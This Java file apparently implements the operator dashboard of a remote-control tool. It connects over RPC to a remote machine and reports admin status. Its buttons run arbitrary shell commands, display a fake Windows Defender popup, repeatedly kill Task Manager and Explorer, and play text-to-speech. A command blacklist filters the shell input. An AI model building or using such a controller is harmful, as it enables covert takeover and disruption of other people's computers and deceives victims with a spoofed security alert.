package main.dashboard;

import com.fasterxml.jackson.databind.JsonNode;
import javafx.application.Platform;
import javafx.geometry.Insets;
import javafx.scene.Parent;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.Priority;
import javafx.scene.layout.VBox;
import main.client.RpcClientHelper;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Dashborad {

    private RpcClientHelper rpc;
    private final ExecutorService rpcExecutor = Executors.newSingleThreadExecutor();

    public Parent createView() throws Exception {
        Label titleLabel = new Label("Control Dashboard");
        titleLabel.getStyleClass().add("title-label");
        //titleLabel.setStyle("-fx-font-size: 18px; -fx-font-weight: bold;");

        Label statusLabel = new Label("Not connected");

        TextArea console = new TextArea();
        console.setEditable(false);
        console.setPrefRowCount(6);
        console.setMinHeight(120);

        Label serverIpLabel = new Label("Server IP:");
        TextField serverIpField = new TextField("127.0.0.1");
        serverIpField.setPromptText("e.g. 192.168.0.1");
        Label serverPortLabel = new Label("Port:");
        TextField serverPortField = new TextField("9000");
        serverIpField.setPromptText("e.g. 9000");

        Label emptyLabel = new Label("");

        Button connectButton = new Button("Connect");
        Button disconnectButton = new Button("Disconnect");
        Button quitButton = new Button("Quit");
        disconnectButton.setDisable(true);

        VBox serverAdress = new VBox(10, serverIpLabel, serverIpField);
        VBox serverPort = new VBox(10, serverPortLabel, serverPortField);

        HBox restUiHorizontal = new HBox(10, connectButton, disconnectButton, quitButton);
        VBox restUiVertical = new VBox(10, emptyLabel, restUiHorizontal);

        HBox connectionRow = new HBox(10, serverAdress, serverPort, restUiVertical);
        connectionRow.setPadding(new Insets(0, 0, 10, 0));

        GridPane formGrid = new GridPane();
        formGrid.setHgap(10);
        formGrid.setVgap(10);

        TextField field1 = addFieldRow(formGrid, 0, "Hello World");
        TextField field2 = addFieldRow(formGrid, 1, "start cmd.exe");
        TextField field3 = addFieldRow(formGrid, 2, "null");
        TextField field4 = addFieldRow(formGrid, 3, "null");
        TextField field5 = addFieldRow(formGrid, 4, "Hello");

        Button button1 = createActionButton("Display Text Test");
        Button button2 = createActionButton("Run Command");
        Button button3 = createActionButton("Display Defender Popup");
        Button button4 = createActionButton("Kill Taskmanager & Explorer Loop");
        Button button5 = createActionButton("TTS");

        //button3.setTooltip(new Tooltip("No permissions to use this function"));

        VBox buttonBox = new VBox(10, button1, button2, button3, button4, button5);
        buttonBox.setPrefWidth(300);

        Button clearConsoleButton = new Button("Clear Console");
        clearConsoleButton.setOnAction(evt -> console.clear());

        HBox mainLayout = new HBox(20, formGrid, buttonBox);
        VBox root = new VBox(15, titleLabel, connectionRow, statusLabel, mainLayout, clearConsoleButton, console);
        root.setPadding(new Insets(20));

        VBox.setVgrow(console, Priority.ALWAYS);

        connectButton.setOnAction(evt -> {
            String ip = serverIpField.getText().trim();
            String portString = serverPortField.getText();

            int portInt;
            try {
                portInt = Integer.parseInt(portString);
            } catch (NumberFormatException e) {
                portInt = 9000;
            }

            connect(statusLabel, console, ip, portInt, connectButton, disconnectButton, quitButton, button1, button2, button3, button4, button5);
        });

        disconnectButton.setOnAction(evt ->
                disconnect(statusLabel, console, connectButton, disconnectButton, quitButton, button1, button2, button3, button4, button5)
        );

        quitButton.setOnAction(evt -> shutdownClient());

        serverIpField.setOnAction(evt -> connectButton.fire());

        button1.setOnAction(evt -> callServer(statusLabel, console, "insertText", field1.getText()));

        /// Button 2 handler & etc.
        CheckForBlacklist checker;
        try {
            checker = new CheckForBlacklist("src/main/resources/blacklist/blacklist.json");
        } catch (Exception e) {
            try {
                checker = new CheckForBlacklist("blacklist/blacklist.json");
            } catch (Exception ex) {
                appendConsole(console, "Could not load blacklist: " + ex.getMessage());
                checker = null;
            }
        }
        // Button action (make sure checker != null)
        CheckForBlacklist finalChecker = checker;
        button2.setOnAction(evt -> {
            String userCmd = field2.getText();
            if (finalChecker != null && finalChecker.isCommandAllowed(userCmd)) {
                callServer(statusLabel, console, "runCmdIgnoreErrors", userCmd);
            } else if (finalChecker != null) {
                appendConsole(console, "Blocked dangerous command: " + userCmd);
            } else {
                appendConsole(console, "Blacklist checker not initialized.");
            }
        });

        button3.setOnAction(evt -> callServer(statusLabel, console, "runDefenderPopup", field3.getText()));
        button4.setOnAction(evt -> callServer(statusLabel, console, "runKillTaskmngrAndExp", field4.getText()));
        button5.setOnAction(evt -> callServer(statusLabel, console, "runTextToSpeech", field5.getText()));

        //runCmdIgnoreErrors

        return root;
    }

    private TextField addFieldRow(GridPane grid, int row, String labelText) {
        Label label = new Label(labelText);
        TextField field = new TextField();
        field.setPromptText(labelText);

        grid.add(label, 0, row);
        grid.add(field, 1, row);
        return field;
    }

    private Button createActionButton(String text) {
        Button button = new Button(text);
        button.setDisable(true);
        return button;
    }

    private void connect(Label statusLabel,
                         TextArea console,
                         String host,
                         int port,
                         Button connectButton,
                         Button disconnectButton,
                         Button quitButton,
                         Button button1,
                         Button button2,
                         Button button3,
                         Button button4,
                         Button button5) {

        statusLabel.setText("Connecting to " + host + ":" + port + " ...");
        statusLabel.setStyle("-fx-text-fill: #ffb433");
        connectButton.setDisable(true);

        rpcExecutor.execute(() -> {
            try {
                RpcClientHelper old = rpc;
                if (old != null) {
                    try { old.close(); } catch (Exception ignored) {}
                }

                rpc = new RpcClientHelper(host, port);

                JsonNode resp = rpc.call("getAdminStatus", RpcClientHelper.paramsWithMessage(""));
                boolean isAdmin = resp.path("result").path("isAdmin").asBoolean(false);

                Platform.runLater(() -> {
                    statusLabel.setStyle("-fx-text-fill: #11c214");
                    statusLabel.setText("Connected to " + host + ":" + port + " (admin=" + isAdmin + ")");
                    appendConsole(console, "Connected. Admin=" + isAdmin);

                    disconnectButton.setDisable(false);
                    connectButton.setDisable(true);
                    quitButton.setDisable(true);

                    button1.setDisable(false);
                    button2.setDisable(false);
                    button3.setDisable(false);
                    button4.setDisable(false);
                    button5.setDisable(false);
                });
            } catch (Exception e) {
                rpc = null;
                Platform.runLater(() -> {
                    statusLabel.setStyle("-fx-text-fill: #c20202");
                    statusLabel.setText("Connection failed: " + e.getMessage());
                    appendConsole(console, "Connection failed: " + e.getMessage());

                    disconnectButton.setDisable(true);
                    connectButton.setDisable(false);

                    button1.setDisable(true);
                    button2.setDisable(true);
                    button3.setDisable(true);
                    button4.setDisable(true);
                    button5.setDisable(true);
                });
            }
        });
    }

    private void disconnect(Label statusLabel,
                            TextArea console,
                            Button connectButton,
                            Button disconnectButton,
                            Button quitButton,
                            Button... rpcButtons) {

        RpcClientHelper old = rpc;
        rpc = null;

        if (old != null) {
            try { old.close(); } catch (Exception ignored) {}
        }

        statusLabel.setStyle("-fx-text-fill: #c20202");
        statusLabel.setText("Disconnected");
        appendConsole(console, "Disconnected");

        disconnectButton.setDisable(true);
        connectButton.setDisable(false);
        quitButton.setDisable(false);

        for (Button b : rpcButtons) b.setDisable(true);
    }

    private void callServer(Label statusLabel, TextArea console, String method, String message) {
        if (rpc == null) {
            statusLabel.setText("Not connected");
            statusLabel.setStyle("-fx-text-fill: #c20202");
            return;
        }

        rpcExecutor.execute(() -> {
            try {
                JsonNode resp = rpc.call(method, RpcClientHelper.paramsWithMessage(message));
                String serverMessage = resp.path("result").path("message").asText("Executed");

                Platform.runLater(() -> {
                    statusLabel.setText("Reply: " + resp);
                    appendConsole(console, serverMessage);
                });
            } catch (Exception e) {
                Platform.runLater(() -> {
                    statusLabel.setText("Error: " + e.getMessage());
                    appendConsole(console, "Error: " + e.getMessage());
                });
            }
        });
    }

    private void appendConsole(TextArea console, String line) {
        String current = console.getText();
        String next = current + (current.isEmpty() ? "" : "\n") + line;

        String[] lines = next.split("\n");
        if (lines.length > 100) {
            StringBuilder sb = new StringBuilder();
            for (int i = lines.length - 100; i < lines.length; i++) {
                sb.append(lines[i]).append("\n");
            }
            next = sb.toString().trim();
        }

        console.setText(next);

        console.positionCaret(console.getLength());
        console.setScrollTop(Double.MAX_VALUE);
    }

    // Made public so AppMain can call it from stop()/onCloseRequest
    public void shutdownClient() {
        // Close RPC connection
        if (rpc != null) {
            try { rpc.close(); } catch (Exception ignored) {}
            rpc = null;
        }

        // Stop background executor (this thread keeps the JVM alive if not shutdown)
        rpcExecutor.shutdownNow();

        // Ensure JavaFX actually exits when window closes
        Platform.exit();
    }
}